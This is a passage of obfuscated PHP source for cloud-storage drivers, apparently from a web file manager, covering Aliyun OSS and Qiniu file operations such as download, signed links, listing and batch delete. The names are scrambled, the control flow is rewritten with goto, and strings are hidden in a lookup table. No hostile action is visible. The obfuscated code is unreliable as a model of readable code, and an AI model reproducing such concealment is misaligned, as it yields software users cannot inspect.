(empty($C„àé…£¼¢)) { return !1; } goto FÜ™êÕï«; b²¢ÆÂ’ÓÍ: $dá¾Ù¸ç× = $cÓ±’óÃéÊ->getListPart(); $fƒÈ©Õ£Õ = array(); foreach ($dá¾Ù¸ç× as $döÖÍ«‚â) { $fƒÈ©Õ£Õ[] = array($cÆ¦ÂŸœáÚ[1262] => $döÖÍ«‚â->getPartNumber(), $cÆ¦ÂŸœáÚ[1263] => trim($döÖÍ«‚â->getETag(), $cÆ¦ÂŸœáÚ[116])); } goto a¿­¼‰ªÊŠ; e–»İ‘˜: $cÆ¦ÂŸœáÚ =& $_SERVER[Ïº«‚ßèÔˆø]; $Dö÷‡ã–À¥ = parse_url_query($F‡¥Ë‡­Ç™[$cÆ¦ÂŸœáÚ[168]]); $cÓ±’óÃéÊ = $this->client->listParts($this->bucket, $this->pathEncode($bŒ®Ìâƒ’¥), $Dö÷‡ã–À¥[$cÆ¦ÂŸœáÚ[220]]); goto b²¢ÆÂ’ÓÍ; DŠäº¶¦…: } public function download($cŞ§³¸Î³, $cîËŠÜ‡ƒÖ) { if ($this->isFolder($cŞ§³¸Î³)) { return !1; } try { $Eëğ¨ÅïÌ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $cîËŠÜ‡ƒÖ); $Eëğ¨ÅïÌ = $this->trafficLimit($_SERVER[Ïº«‚ßèÔˆø][109], $Eëğ¨ÅïÌ); $this->client->getObject($this->bucket, $this->pathEncode($cŞ§³¸Î³), $Eëğ¨ÅïÌ); } catch (OSS\Core\OssException $CÂóÉËé) { return !1; } return $cîËŠÜ‡ƒÖ; } public function fileSubstr($FŸáƒìØ¼‹, $aÈ¦íÑ»«÷ = 0, $A¼Ìê¤»‹« = false) { if ($aÈ¦íÑ»«÷ === -1) { $F‹ƒ÷õ…´ = array(); } else { if ($A¼Ìê¤»‹« === !1) { $FÇ»ß¸æ¿ = $this->size($FŸáƒìØ¼‹); } else { $FÇ»ß¸æ¿ = $aÈ¦íÑ»«÷ + $A¼Ìê¤»‹« - 1; } $F‹ƒ÷õ…´ = array(OSS\OssClient::OSS_RANGE => "{$aÈ¦íÑ»«÷}\x2d{$FÇ»ß¸æ¿}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($FŸáƒìØ¼‹), $F‹ƒ÷õ…´); } catch (OSS\Core\OssException $fÇÁíåğÆ) { think_exception($fÇÁíåğÆ->getMessage()); return !1; } } private function trafficLimit($eƒÕŒ¾œ—, $a†ÎÖ§‹Ã¢ = array()) { goto f¥¡Õ³İ; aóâ¾º­âÕ: if (!$Fèˆ®ƒö) { return $a†ÎÖ§‹Ã¢; } $Fèˆ®ƒö = $Fèˆ®ƒö < 819200 ? 819200 : ($Fèˆ®ƒö > 838860800 ? 838860800 : $Fèˆ®ƒö); $a†ÎÖ§‹Ã¢[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($Fèˆ®ƒö); goto dÄ—²«¶©Ï; f¥¡Õ³İ: $cºÙ³äˆ®Í =& $_SERVER[Ïº«‚ßèÔˆø]; if ($eƒÕŒ¾œ— == $cºÙ³äˆ®Í[1269] && $this->isUploadServer() || $eƒÕŒ¾œ— == $cºÙ³äˆ®Í[109] && $this->isFileOutServer()) { return $a†ÎÖ§‹Ã¢; } $Fèˆ®ƒö = floatval($GLOBALS[$cºÙ³äˆ®Í[6]][$cºÙ³äˆ®Í[88]][$cºÙ³äˆ®Í[107]][$eƒÕŒ¾œ—]) * 1024 * 1024 * 8; goto aóâ¾º­âÕ; dÄ—²«¶©Ï: return $a†ÎÖ§‹Ã¢; goto CŸŒ°Òå¬È; CŸŒ°Òå¬È: } public function link($B§‰“»–‚œ, $b›ø‰Œö™‰ = array()) { $BÚ•öö›Ô =& $_SERVER[Ïº«‚ßèÔˆø]; if (!$this->exist($B§‰“»–‚œ) || $this->isFolder($B§‰“»–‚œ)) { return !1; } try { $b›ø‰Œö™‰ = $this->trafficLimit($BÚ•öö›Ô[109], $b›ø‰Œö™‰); $CƒĞçÓÎ = $this->client->signUrl($this->bucket, $this->pathEncode($B§‰“»–‚œ), 3600 * 12, $BÚ•öö›Ô[227], $b›ø‰Œö™‰); return $this->getCdnLink($CƒĞçÓÎ); } catch (OSS\Core\OssException $dŞøŒ‡ Á°) { return !1; } } public function fileOut($aÁëšâ³Ü, $DˆìŸ‡£ÙÖ = false, $C½­Ô…İ¶ = false, $e” õä†ƒ‰ = '') { goto b×ŒÓâ†·Â; eä—©ÉÒ­: $C½­Ô…İ¶ = rawurlencode($C½­Ô…İ¶); $AßİÈèÙ„¢ = get_file_mime(get_path_ext($C½­Ô…İ¶)); if ($AßİÈèÙ„¢ == $déßÈ¿ÇŠ£[212]) { return parent::fileOut($aÁëšâ³Ü, $DˆìŸ‡£ÙÖ, $C½­Ô…İ¶, $e” õä†ƒ‰); } goto A÷œä¨®Æä; b×ŒÓâ†·Â: $déßÈ¿ÇŠ£ =& $_SERVER[Ïº«‚ßèÔˆø]; if ($this->isFileOutServer()) { return $this->fileOutServer($aÁëšâ³Ü, $DˆìŸ‡£ÙÖ, $C½­Ô…İ¶, $e” õä†ƒ‰); } if (!$C½­Ô…İ¶) { $C½­Ô…İ¶ = $this->pathThis($aÁëšâ³Ü); } goto eä—©ÉÒ­; aœÑÜØ¿Ò®: $Dí›Éê×ºÔ = $this->link($aÁëšâ³Ü, $C„åğÖÆ¨÷); $this->fileOutLink($Dí›Éê×ºÔ); goto fĞãâš‘§Í; A÷œä¨®Æä: $DˆìŸ‡£ÙÖ = $DˆìŸ‡£ÙÖ ? $déßÈ¿ÇŠ£[213] : $déßÈ¿ÇŠ£[214]; $C„åğÖÆ¨÷ = array(OSS\OssClient::OSS_SUB_RESOURCE => $déßÈ¿ÇŠ£[1280] . rawurlencode("{$DˆìŸ‡£ÙÖ}\73\146\151\154\x65\156\x61\155\x65\75{$C½­Ô…İ¶}")); $C„åğÖÆ¨÷[OSS\OssClient::OSS_SUB_RESOURCE] .= $déßÈ¿ÇŠ£[1281] . rawurlencode($AßİÈèÙ„¢); goto aœÑÜØ¿Ò®; fĞãâš‘§Í: } public function fileOutServer($Aò¯²Ü¾³œ, $e×‡‚ğùÕ¥ = false, $Cî²Ô¿õø = false, $e„‰¼¸ÅÕĞ = '') { parent::fileOut($Aò¯²Ü¾³œ, $e×‡‚ğùÕ¥, $Cî²Ô¿õø, $e„‰¼¸ÅÕĞ); } public function fileOutImage($b¨ßØÏ–½é, $BÈ­Š½‡® = 250) { $b×¿ˆ‹ÔÙÓ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[Ïº«‚ßèÔˆø][1282] . $BÈ­Š½‡®); $C¡öœ—‰ÁÅ = $this->link($b¨ßØÏ–½é, $b×¿ˆ‹ÔÙÓ); $this->fileOutLink($C¡öœ—‰ÁÅ); } public function fileOutImageServer($A»ƒÜ¶‹§, $d‹áÀÑ’‡Ğ = 250) { parent::fileOutImage($A»ƒÜ¶‹§, $d‹áÀÑ’‡Ğ); } public function fileOutLink($bÉáøÄ†å÷) { $FšøòØÆš¨ =& $_SERVER[Ïº«‚ßèÔˆø]; if (!$this->isCdnHost() && substr($bÉáøÄ†å÷, 0, 7) == $FšøòØÆš¨[1185]) { $bÉáøÄ†å÷ = $FšøòØÆš¨[1186] . substr($bÉáøÄ†å÷, 7); } header($FšøòØÆš¨[159] . $bÉáøÄ†å÷); die; } public function hashMd5($BÌÚßµ„Ğ¸, $Eà²Ò‚â‹¾ = '') { $EõÂ™šƒ…ƒ =& $_SERVER[Ïº«‚ßèÔˆø]; $b…·‡‹Å…À = $this->_objectMeta($BÌÚßµ„Ğ¸); if (!$b…·‡‹Å…À) { return $EõÂ™šƒ…ƒ[33]; } if (!isset($b…·‡‹Å…À[$EõÂ™šƒ…ƒ[1258]]) && !empty($Eà²Ò‚â‹¾)) { $e¢Ÿ‘ŒŒå = $this->updateObjMeta($BÌÚßµ„Ğ¸, array($EõÂ™šƒ…ƒ[1258] => $Eà²Ò‚â‹¾)); $b…·‡‹Å…À[$EõÂ™šƒ…ƒ[1258]] = $e¢Ÿ‘ŒŒå ? $Eà²Ò‚â‹¾ : $EõÂ™šƒ…ƒ[33]; } return isset($b…·‡‹Å…À[$EõÂ™šƒ…ƒ[1258]]) ? strtolower($b…·‡‹Å…À[$EõÂ™šƒ…ƒ[1258]]) : $EõÂ™šƒ…ƒ[33]; } public function size($dŠ˜ÁŸéÉî) { $EÀÄÎë†‰Ù = $this->objectMeta($dŠ˜ÁŸéÉî); return $EÀÄÎë†‰Ù ? $EÀÄÎë†‰Ù[$_SERVER[Ïº«‚ßèÔˆø][78]] : 0; } public function info($Aààìî˜…Û) { if ($this->isFolder($Aààìî˜…Û)) { return $this->folderInfo($Aààìî˜…Û); } else { if ($this->isFile($Aààìî˜…Û)) { return $this->fileInfo($Aààìî˜…Û); } } return !1; } public function exist($e¸ó–¹ô»Å) { return $this->isFile($e¸ó–¹ô»Å) || $this->isFolder($e¸ó–¹ô»Å); } public function isFile($c…Œö ƒá) { return !$this->isFolder($c…Œö ƒá) && $this->objectMeta($c…Œö ƒá); } public function isFolder($EÉ°£¦——™) { return $this->cacheMethod($_SERVER[Ïº«‚ßèÔˆø][198], $EÉ°£¦——™); } protected function objectMeta($C¦±­¨ò¾Š) { return $this->cacheMethod($_SERVER[Ïº«‚ßèÔˆø][199], $C¦±­¨ò¾Š); } protected function _objectMeta($A‰Ç¯Äñ‘î) { $Aä³÷™òÎ­ =& $_SERVER[Ïº«‚ßèÔˆø]; try { $EÍ·©õµ£ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($A‰Ç¯Äñ‘î)); } catch (OSS\Core\OssException $D«“°¦–‡Ê) { $EÍ·©õµ£ = !1; } if ($EÍ·©õµ£) { $EÍ·©õµ£[$Aä³÷™òÎ­[78]] = intval($EÍ·©õµ£[$Aä³÷™òÎ­[1256]]); } return $EÍ·©õµ£; } protected function _isFolder($dÍŸéíùˆ†) { $CÉ¼¯œÑ¸Ù =& $_SERVER[Ïº«‚ßèÔˆø]; if ($dÍŸéíùˆ† == $CÉ¼¯œÑ¸Ù[33] || $dÍŸéíùˆ† == $CÉ¼¯œÑ¸Ù[8]) { return !0; } $e¤Ó¯­Šï = array($CÉ¼¯œÑ¸Ù[1252] => $CÉ¼¯œÑ¸Ù[8], $CÉ¼¯œÑ¸Ù[1253] => rtrim($dÍŸéíùˆ†, $CÉ¼¯œÑ¸Ù[8]) . $CÉ¼¯œÑ¸Ù[8], $CÉ¼¯œÑ¸Ù[1254] => 1, $CÉ¼¯œÑ¸Ù[1255] => $CÉ¼¯œÑ¸Ù[33]); $aŸ£áÜÎÌ = $this->client->listObjects($this->bucket, $e¤Ó¯­Šï); if ($aŸ£áÜÎÌ->getObjectList() || $aŸ£áÜÎÌ->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public function __construct($bİ‹„‹¬½¤) { parent::__construct(); require_once SDK_DIR . $_SERVER[Ïº«‚ßèÔˆø][1283]; $this->_init($bİ‹„‹¬½¤); } public function _init($bõ±§ëÑˆ‘) { goto C»Á¹÷ÃàÄ; dŞ…‰ñíÕ: $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); goto F¸ºî¬»¤Á; C»Á¹÷ÃàÄ: $E„¼òŞÃñª =& $_SERVER[Ïº«‚ßèÔˆø]; foreach ($bõ±§ëÑˆ‘ as $aƒÍ×İ´¬í => $EºĞßíÏàø) { if (isset($this->{$aƒÍ×İ´¬í})) { $this->{$aƒÍ×İ´¬í} = $EºĞßíÏàø; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($E„¼òŞÃñª[1284] . LNG($E„¼òŞÃñª[1243])); } goto EĞóöŞ¹èÜ; EĞóöŞ¹èÜ: $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); goto dŞ…‰ñíÕ; F¸ºî¬»¤Á: } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($E¸áœ›¿À, $a¤¿ÈÛ¯¶¹ = '', $b¾ô×ÙÈ©Û = REPEAT_RENAME) { if ($this->setContent($E¸áœ›¿À, $a¤¿ÈÛ¯¶¹)) { return $this->getPathOuter($E¸áœ›¿À); } return !1; } public function mkdir($Eğ¢ÌÑÉ‰, $C»‚À¢‰­ä = REPEAT_SKIP) { goto b’±‡ììéø; b’±‡ììéø: $E†ÙÊ‹ãù– =& $_SERVER[Ïº«‚ßèÔˆø]; $Dîœ›Î²¯ = trim($Eğ¢ÌÑÉ‰, $E†ÙÊ‹ãù–[8]); if ($this->_isFolder($Dîœ›Î²¯)) { return $this->getPathOuter($Dîœ›Î²¯); } goto A¿Ìæ›Äİ; dµš¬ï§¿: if (!$this->mkfile($B¢Â‰¢±Ó´)) { return !1; } if (!$this->moveFile($B¢Â‰¢±Ó´, $Eğ¢ÌÑÉ‰)) { $this->delFile($B¢Â‰¢±Ó´); return !1; } return $this->getPathOuter($Dîœ›Î²¯); goto Aó´Äš’·§; A¿Ìæ›Äİ: $Eğ¢ÌÑÉ‰ = $Dîœ›Î²¯ . $E†ÙÊ‹ãù–[8]; $CóÈªšÈéÁ = get_path_this($Dîœ›Î²¯); $B¢Â‰¢±Ó´ = $Eğ¢ÌÑÉ‰ . $CóÈªšÈéÁ; goto dµš¬ï§¿; Aó´Äš’·§: } public function copyFile($Cæ×ÑÂÂ, $E ¦í…İÀÂ) { $BÁ™îÉÅÙî = $this->bucketManager->copy($this->bucket, $Cæ×ÑÂÂ, $this->bucket, $E ¦í…İÀÂ, !0); return $BÁ™îÉÅÙî ? !1 : $this->getPathOuter($E ¦í…İÀÂ); } public function moveFile($DÙÆë—óÛ, $AĞ‘¡õ¥ƒ) { $d¾¨¹Úœš™ = $this->bucketManager->move($this->bucket, $DÙÆë—óÛ, $this->bucket, $AĞ‘¡õ¥ƒ, !0); return $d¾¨¹Úœš™ ? !1 : $this->getPathOuter($AĞ‘¡õ¥ƒ); } public function delFile($f‹‰ß›Ëùö) { if (!$this->exist($f‹‰ß›Ëùö)) { return !0; } $CÙáÍ– = $this->bucketManager->delete($this->bucket, $f‹‰ß›Ëùö); return $CÙáÍ– ? !1 : !0; } public function delFolder($cÇòò¬®‚) { goto cã‹éÆ²Á; eé«²¶ø×…: if (!empty($cÇòò¬®‚) && !in_array($Eáîå©À‡ˆ, $Dê‡àè©Ñº[$C„¬Öç®Œ’[75]])) { $Dê‡àè©Ñº[$C„¬Öç®Œ’[75]][] = $Eáîå©À‡ˆ; } $f™‰å–†–§ = $this->delByBatch($Dê‡àè©Ñº[$C„¬Öç®Œ’[74]]); if (!$f™‰å–†–§) { return !1; } goto b ¡Òê«; b ¡Òê«: return $this->delByBatch($Dê‡àè©Ñº[$C„¬Öç®Œ’[75]]); goto BÏõó¤–Á¸; cã‹éÆ²Á: $C„¬Öç®Œ’ =& $_SERVER[Ïº«‚ßèÔˆø]; if (!$this->exist($cÇòò¬®‚)) { return !0; } $this->listItemCache = !1; goto fó¶¸Òœ; fó¶¸Òœ: $Dê‡àè©Ñº = $this->fileList($cÇòò¬®‚); $this->listItemCache = !0; $Eáîå©À‡ˆ = trim($cÇòò¬®‚, $C„¬Öç®Œ’[8]) . $C„¬Öç®Œ’[8]; goto eé«²¶ø×…; BÏõó¤–Á¸: } private function delByBatch($FÚ·Ê²›Ù¦) { foreach (array_chunk($FÚ·Ê²›Ù¦, 1000) as $DÎ’çÍù ) { $fŒ…ì¿‡„ = $this->bucketManager->buildBatchDelete($this->bucket, $DÎ’çÍù ); list($A¹£›ùæ, $d›øÄ¤¨‡) = $this->bucketManager->batch($fŒ…ì¿‡„); if ($d›øÄ¤¨‡) { return !1; } } return !0; } public function rename($D¸ò’­™, $aò§àØÑ´ç) { return $this->renameObject($D¸ò’­™, $aò§àØÑ´ç); } public function fileInfo($bƒÂå’ªˆ‰, $Aê˜»¢àæ’ = false, $f¶ò‡‘ÆµÁ = array()) { goto aœÍ©—Š¿ê; E­—‘ÚÓ¸: $a«­Áß¹éÜ[$fõÉâš·Íß[193]] = $a«­Áß¹éÜ[$fõÉâš·Íß[84]] = 0; $a«­Áß¹éÜ[$fõÉâš·Íß[194]] = $a«­Áß¹éÜ[$fõÉâš·Íß[195]] = !0; if (empty($f¶ò‡‘ÆµÁ)) { $f¶ò‡‘ÆµÁ = $this->objectMeta($bƒÂå’ªˆ‰); if (!$f¶ò‡‘ÆµÁ) { return $a«­Áß¹éÜ; } } goto EÅÁï¦ÖÑ´; EÅÁï¦ÖÑ´: if (isset($f¶ò‡‘ÆµÁ[$fõÉâš·Íß[1286]])) { $a«­Áß¹éÜ[$fõÉâš·Íß[84]] = substr($f¶ò‡‘ÆµÁ[$fõÉâš·Íß[1286]] . $fõÉâš·Íß[33], 0, 10); } if (isset($f¶ò‡‘ÆµÁ[$fõÉâš·Íß[1285]])) { $a«­Áß¹éÜ[$fõÉâš·Íß[78]] = $f¶ò‡‘ÆµÁ[$fõÉâš·Íß[1285]]; } return $a«­Áß¹éÜ; goto Eò“Ôß¹Î¶; aœÍ©—Š¿ê: $fõÉâš·Íß =& $_SERVER[Ïº«‚ßèÔˆø]; $a«­Áß¹éÜ = array($fõÉâš·Íß[28] => $this->pathThis($bƒÂå’ªˆ‰), $fõÉâš·Íß[76] => $this->getPathOuter($fõÉâš·Íß[8] . $bƒÂå’ªˆ‰), $fõÉâš·Íß[29] => $fõÉâš·Íß[192], $fõÉâš·Íß[78] => isset($f¶ò‡‘ÆµÁ[$fõÉâš·Íß[1285]]) ? $f¶ò‡‘ÆµÁ[$fõÉâš·Íß[1285]] : 0, $fõÉâš·Íß[168] => $this->ext($bƒÂå’ªˆ‰)); if ($Aê˜»¢àæ’) { return $a«­Áß¹éÜ; } goto E­—‘ÚÓ¸; Eò“Ôß¹Î¶: } public function folderInfo($aƒ†¨›ºÆá, $bæ«±‰¦ = false) { goto dÊÄ³À˜¨ó; fÍˆ¸¶ëÕİ: $CÉé¤ñ©¶É = $this->objectMeta($aƒ†¨›ºÆá); if (isset($CÉé¤ñ©¶É[$c‘Ñ¹íÈ·¬[1286]])) { $E¿æ®‹÷î[$c‘Ñ¹íÈ·¬[84]] = substr($CÉé¤ñ©¶É[$c‘Ñ¹íÈ·¬[1286]] . $c‘Ñ¹íÈ·¬[33], 0, 10); } return $E¿æ®‹÷î; goto f¶¥ñ†Èª; dÊÄ³À˜¨ó: $c‘Ñ¹íÈ·¬ =& $_SERVER[Ïº«‚ßèÔˆø]; $E¿æ®‹÷î = array($c‘Ñ¹íÈ·¬[28] => $this->pathThis($aƒ†¨›ºÆá), $c‘Ñ¹íÈ·¬[76] => $this->getPathOuter($c‘Ñ¹íÈ·¬[8] . $aƒ†¨›ºÆá), $c‘Ñ¹íÈ·¬[29] => $c‘Ñ¹íÈ·¬[77]); if ($bæ«±‰¦) { return $E¿æ®‹÷î; } goto fàëôØ¼ä; fàëôØ¼ä: $E¿æ®‹÷î[$c‘Ñ¹íÈ·¬[193]] = $E¿æ®‹÷î[$c‘Ñ¹íÈ·¬[84]] = 0; $E¿æ®‹÷î[$c‘Ñ¹íÈ·¬[194]] = $E¿æ®‹÷î[$c‘Ñ¹íÈ·¬[195]] = !0; $aƒ†¨›ºÆá = rtrim($aƒ†¨›ºÆá, $c‘Ñ¹íÈ·¬[8]) . $c‘Ñ¹íÈ·¬[8]; goto fÍˆ¸¶ëÕİ; f¶¥ñ†Èª: } public function listPath($bê˜à©æ˜Î, $b¦ÊĞË¡Œí = false) { $b¬™—±›ˆ„ =& $_SERVER[Ïº«‚ßèÔˆø]; $EÖ˜åƒ¤‰ê = $this->fileList($bê˜à©æ˜Î, $b¬™—±›ˆ„[8], !0); foreach ($EÖ˜åƒ¤‰ê[$b¬™—±›ˆ„[75]] as $b–âŞ›µÑù => $d°Ö›ö¤ ±) { $EÖ˜åƒ¤‰ê[$b¬™—±›ˆ„[75]][$b–âŞ›µÑù] = $this->folderInfo($d°Ö›ö¤ ±, $b¦ÊĞË¡Œí); } foreach ($EÖ˜åƒ¤‰ê[$b¬™—±›ˆ„[74]] as $b–âŞ›µÑù => $d°Ö›ö¤ ±) { $EÖ˜åƒ¤‰ê[$b¬™—±›ˆ„[74]][$b–âŞ›µÑù] = $this->fileInfo($d°Ö›ö¤ ±[$b¬™—±›ˆ„[93]], $b¦ÊĞË¡Œí, $d°Ö›ö¤ ±); } return $EÖ˜åƒ¤‰ê; } public function has($b‚ÇÉ†ĞñÉ, $fÚØŒ“³İ§ = false, $Bø¯«‰«é‹ = true) { goto f£ùÌæ•; f£ùÌæ•: $AÂÖñÂ®ª =& $_SERVER[Ïº«‚ßèÔˆø]; $b‚ÇÉ†ĞñÉ = trim($b‚ÇÉ†ĞñÉ, $AÂÖñÂ®ª[8]); $a¿º¤ß‘ˆø = empty($b‚ÇÉ†ĞñÉ) ? $AÂÖñÂ®ª[33] : $b‚ÇÉ†ĞñÉ . $AÂÖñÂ®ª[8]; goto FÓÅÆßÃ; ağ¯­ÙóÌæ: return !1; goto D¼£®£‚¯º; F¡¢Â¿ƒ¥³: $C©­ù×øÍĞ = $E‰Ş–ÚÕØ˜ = 0; while (!0) { check_abort(); list($Fô·“ñÕÀè, $Fİôˆ…‚ï¸) = $this->bucketManager->listFiles($this->bucket, $a¿º¤ß‘ˆø, $D¨¿µñöÔ, $CÅĞ¡ëÜÕó, $BÒö¯¥ÙÒ÷); if ($Fİôˆ…‚ï¸) { break; } $D¨¿µñöÔ = array_key_exists($AÂÖñÂ®ª[1255], $Fô·“ñÕÀè) ? $D¨¿µñöÔ = $Fô·“ñÕÀè[$AÂÖñÂ®ª[1287]] : $AÂÖñÂ®ª[33]; if ($fÚØŒ“³İ§) { if (!empty($Fô·“ñÕÀè[$AÂÖñÂ®ª[1288]])) { $C©­ù×øÍĞ += count($Fô·“ñÕÀè[$AÂÖñÂ®ª[1288]]); } if (!empty($Fô·“ñÕÀè[$AÂÖñÂ®ª[1289]])) { $E‰Ş–ÚÕØ˜ += count($Fô·“ñÕÀè[$AÂÖñÂ®ª[1289]]); } if ($D¨¿µñöÔ === $AÂÖñÂ®ª[33]) { break; } continue; } if ($Bø¯«‰«é‹) { if (!empty($Fô·“ñÕÀè[$AÂÖñÂ®ª[1288]])) { return !0; } } else { if (!empty($Fô·“ñÕÀè[$AÂÖñÂ®ª[1289]])) { return !0; } } if ($D¨¿µñöÔ === $AÂÖñÂ®ª[33]) { break; } } if ($fÚØŒ“³İ§) { return array($AÂÖñÂ®ª[202] => $C©­ù×øÍĞ, $AÂÖñÂ®ª[203] => $E‰Ş–ÚÕØ˜); } goto ağ¯­ÙóÌæ; FÓÅÆßÃ: $D¨¿µñöÔ = $AÂÖñÂ®ª[33]; $CÅĞ¡ëÜÕó = 500; $BÒö¯¥ÙÒ÷ = $AÂÖñÂ®ª[8]; goto F¡¢Â¿ƒ¥³; D¼£®£‚¯º: } public function listAll($cÁ´½ë¸¿ˆ) { $eÔ±ÄáÑ¨ =& $_SERVER[Ïº«‚ßèÔˆø]; $FÆµíï²îÚ = $this->fileList($cÁ´½ë¸¿ˆ, $eÔ±ÄáÑ¨[33], !0); $f¸¶ò´ê‹Ğ = array(); foreach ($FÆµíï²îÚ[$eÔ±ÄáÑ¨[74]] as $eø³é»êÏ) { $f¸¶ò´ê‹Ğ[$eø³é»êÏ[$eÔ±ÄáÑ¨[93]]] = $eø³é»êÏ[$eÔ±ÄáÑ¨[78]]; } foreach ($FÆµíï²îÚ[$eÔ±ÄáÑ¨[75]] as $eø³é»êÏ) { if (is_string($eø³é»êÏ)) { $f¸¶ò´ê‹Ğ[$eø³é»êÏ] = 0; } } return $this->listAllFiles($cÁ´½ë¸¿ˆ, array_keys($f¸¶ò´ê‹Ğ), $f¸¶ò´ê‹Ğ); } private function fileList($aßöºÉÄ¼…, $F‚ŠçêÁšİ = '', $F•¨±¸°®¬ = 0) { goto FÀóß¼õÈ¼; FÀóß¼õÈ¼: $cäöğ¿¡²† =& $_SERVER[Ïº«‚ßèÔˆø]; $aßöºÉÄ¼… = trim($aßöºÉÄ¼…, $cäöğ¿¡²†[8]); $cí‘‚‡ùÅÂ = empty($aßöºÉÄ¼…) ? $cäöğ¿¡²†[33] : $aßöºÉÄ¼… . $cäöğ¿¡²†[8]; goto Eğ„êÓ¦øÈ; dÕ—Å†›öô: $e†³‰“ÖĞ = $BæÇŸ³ææé = array(); while (!0) { check_abort(); list($EÒªæÁÈ´Ÿ, $d–Ò…ªÍÊ) = $this->bucketManager->listFiles($this->bucket, $cí‘‚‡ùÅÂ, $dÍå½Èæ¬ƒ, $Bææ¶Å†Æ, $F‚ŠçêÁšİ); if ($d–Ò…ªÍÊ) { break; } $dÍå½Èæ¬ƒ = array_key_exists($cäöğ¿¡²†[1255], $EÒªæÁÈ´Ÿ) ? $dÍå½Èæ¬ƒ = $EÒªæÁÈ´Ÿ[$cäöğ¿¡²†[1287]] : $cäöğ¿¡²†[33]; $Cí¼÷ª‹†± = isset($EÒªæÁÈ´Ÿ[$cäöğ¿¡²†[1288]]) ? $EÒªæÁÈ´Ÿ[$cäöğ¿¡²†[1288]] : array(); $b÷µ´©‹” = isset($EÒªæÁÈ´Ÿ[$cäöğ¿¡²†[1289]]) ? $EÒªæÁÈ´Ÿ[$cäöğ¿¡²†[1289]] : array(); foreach ($Cí¼÷ª‹†± as $EæÑÜ¦‹İ¤) { goto c‰íÌ…„; bŒ‘æ•ìšá: if ($b®Ã˜¾Ö¯) { $e†³‰“ÖĞ[] = $c‘ªÍ¡¡Ä›; continue; } $BæÇŸ³ææé[] = $F•¨±¸°®¬ ? $EæÑÜ¦‹İ¤ : $c‘ªÍ¡¡Ä›; goto b¾¦×Š÷©Ÿ; A»¯âàŠ: $EæÑÜ¦‹İ¤[$cäöğ¿¡²†[78]] = $c±‘—ç„Ä; $b®Ã˜¾Ö¯ = $c±‘—ç„Ä == 0 && substr($c‘ªÍ¡¡Ä›, strlen($c‘ªÍ¡¡Ä›) - 1, 1) == $cäöğ¿¡²†[8] ? !0 : !1; if ($f¬®†ÇÇê‘) { $this->cacheMethod($cäöğ¿¡²†[198], $c‘ªÍ¡¡Ä›, $b®Ã˜¾Ö¯); $this->cacheMethod($cäöğ¿¡²†[199], $c‘ªÍ¡¡Ä›, $EæÑÜ¦‹İ¤); } goto bŒ‘æ•ìšá; c‰íÌ…„: if ($EæÑÜ¦‹İ¤[$cäöğ¿¡²†[93]] == $cí‘‚‡ùÅÂ) { continue; } $c‘ªÍ¡¡Ä› = $EæÑÜ¦‹İ¤[$cäöğ¿¡²†[93]]; $c±‘—ç„Ä = $EæÑÜ¦‹İ¤[$cäöğ¿¡²†[1285]]; goto A»¯âàŠ; b¾¦×Š÷©Ÿ: } foreach ($b÷µ´©‹” as $c‘ªÍ¡¡Ä›) { if ($c‘ªÍ¡¡Ä› == $cí‘‚‡ùÅÂ) { continue; } $e†³‰“ÖĞ[] = $c‘ªÍ¡¡Ä›; if ($f¬®†ÇÇê‘) { $this->cacheMethod($cäöğ¿¡²†[198], $c‘ªÍ¡¡Ä›, !0); } } if ($dÍå½Èæ¬ƒ === $cäöğ¿¡²†[33]) { break; } } if ($f¬®†ÇÇê‘) { $this->cacheMethod($cäöğ¿¡²†[198], $aßöºÉÄ¼…, !0); } goto DÁ¡î’öÅ; Eğ„êÓ¦øÈ: $dÍå½Èæ¬ƒ = $cäöğ¿¡²†[33]; $Bææ¶Å†Æ = 1000; $f¬®†ÇÇê‘ = $this->listItemCache === !1 ? !1 : !0; goto dÕ—Å†›öô; DÁ¡î’öÅ: return array($cäöğ¿¡²†[75] => $e†³‰“ÖĞ, $cäöğ¿¡²†[74] => $BæÇŸ³ææé); goto Aö‹ïì½Â‘; Aö‹ïì½Â‘: } public function canRead($féë¡á®Ì) { return $this->exist($féë¡á®Ì) ? !0 : !1; } public function canWrite($bÇ‰±äø) { return $this->exist($bÇ‰±äø) ? !0 : !1; } public function getContent($B­ñÄîĞ°ì) { return $this->fileSubstr($B­ñÄîĞ°ì, 0, -1); } public function setContent($DãØãàÅ¶Œ, $E¿‘ßÍù§ = '') { $d‚° äŸº® = $this->tempFile($this->pathThis($DãØãàÅ¶Œ)); file_put_contents($d‚° äŸº®, $E¿‘ßÍù§); if ($this->upload($DãØãàÅ¶Œ, $d‚° äŸº®)) { $this->tempFileRemve($d‚° äŸº®); return !0; } return !1; } public function refreshUrls($cåŸâÜª•º) { goto F»ÓÙ›íµ; fÄô³½†§½: $CÆÃ»¨ˆ¬ = new Qiniu\Cdn\CdnManager($this->auth); list($AÓ¥¥ÉÎ’¥, $B³÷»¡áÀŸ) = $CÆÃ»¨ˆ¬->refreshUrls($A‚³˜”“Ç¡); if ($B³÷»¡áÀŸ) { return !1; } goto BÀàè”ªª¬; F»ÓÙ›íµ: $Bíèù˜¿† =& $_SERVER[Ïº«‚ßèÔˆø]; $A‚³˜”“Ç¡ = array(); if (is_array($cåŸâÜª•º)) { foreach ($cåŸâÜª•º as $cÜ„µáÎÑ) { $A‚³˜”“Ç¡[] = $this->link($cÜ„µáÎÑ); } } else { $A‚³˜”“Ç¡[] = $this->link($cåŸâÜª•º); } goto fÄô³½†§½; BÀàè”ªª¬: return $AÓ¥¥ÉÎ’¥[$Bíèù˜¿†[1061]] == $Bíèù˜¿†[704] ? !0 : !1; goto A‰¢³ƒ•™ñ; 